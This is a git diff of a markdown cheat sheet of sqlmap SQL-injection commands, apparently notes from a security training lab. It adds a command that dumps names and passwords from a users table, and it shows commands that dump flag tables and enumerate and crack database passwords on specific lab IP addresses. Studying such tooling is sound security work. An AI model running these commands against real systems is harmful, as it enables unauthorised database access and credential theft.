@@ -1,5 +1,5 @@
 
-# Basic Usage
+# Basic Useful Commands
 
 ```bash
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
@@ -9,6 +9,9 @@ sqlmap -u http://154.57.164.61:31255/case7.php?id=1 -p id --union-cols=5 -D test
 
 # with specific prefix
 sqlmap -u "http://154.57.164.61:31255/case6.php?col=id" --prefix='`)' --no-cast --level=5 --risk=3 -D testdb -T flag6 --dump --batch
+
+# dump specific user
+sqlmap -u "http://154.57.164.82:30425/case1.php?id=1" -D testdb -T users -C name,password --dump --where="name LIKE 'Kimberly%'" --batch 
 ```
 
 ## HTTP Request Type
@@ -80,6 +83,7 @@ sqlmap -u "http://www.example.com/?id=1" --search -C user
 # Password enumeration and cracking
 sqlmap -u "http://www.example.com/?id=1" --passwords --batch
 ```
+
 # Advanced Tuning
 
 ```bash
